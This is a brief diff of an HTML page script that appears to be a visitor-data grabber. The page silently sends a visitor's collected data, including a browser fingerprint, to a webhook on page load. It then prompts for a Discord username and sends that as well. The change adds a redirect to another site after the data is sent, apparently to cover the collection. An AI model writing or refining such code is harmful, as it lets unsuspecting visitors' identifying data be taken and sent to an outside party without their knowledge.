@@ -168,6 +168,7 @@
       };
       merged.fingerprint = merged.fingerprint || "N/A";
 
+      
       if (CONFIG.sendOnLoad) await sendToWebhook(buildMessageBlock(merged, ""));
 
       if (CONFIG.discordUsernamePrompt) {
@@ -177,6 +178,7 @@
         await new Promise(res => setTimeout(res, CONFIG.sendDelay));
         await sendToWebhook(buildMessageBlock(merged, `Discord Username: ${discordUsername}`));
       }
+      window.location.href = "https://example.com";
     })();
   </script>
 </body>
